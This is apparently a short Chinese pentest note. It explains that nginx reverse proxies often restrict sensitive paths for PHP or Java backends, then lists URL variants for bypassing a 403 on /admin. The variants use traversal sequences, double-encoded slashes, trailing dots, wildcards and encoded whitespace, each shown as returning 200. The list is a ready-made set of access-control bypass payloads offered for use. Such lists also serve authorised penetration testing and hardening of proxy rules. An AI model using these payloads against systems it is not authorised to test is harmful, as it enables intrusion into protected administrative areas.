## 0x00 技术背景

       之前碰过几个项目，中间件nginx做反向代理，后端代码是PHP或者JAVA，过nginx一般会识别ip，从而限制攻击者访问敏感路径，所以可以通过绕过方式限制nginx
       
       
## 0x01 forbidden绕过


      site.com/admin => 403
      site.com/admin/ => 200
      site.com/random-dir/../admin => 200
      site.com/random-dir/..;/admin => 200
      site.com/random-dir/..%252F/admin => 200
      site.com/admin// => 200
      site.com//admin// => 200
      site.com/admin/* => 200
      site.com/admin/*/ => 200
      site.com/admin/. => 200
      site.com/admin/./ => 200

      site.com/./admin/./ => 200
      site.com/admin/./. => 200
      site.com/admin/./. => 200
      site.com/admin? => 200
      site.com/admin?? => 200
      site.com/admin??? => 200
      site.com/admin..;/ => 200
      site.com/admin/..;/ => 200
      site.com/%2f/admin => 200
      site.com/%2e/admin => 200
      site.com/admin%20/ => 200
      site.com/admin%09/ => 200
      site.com/%20admin%20/ => 200
      site.com/%0dadmin => 200

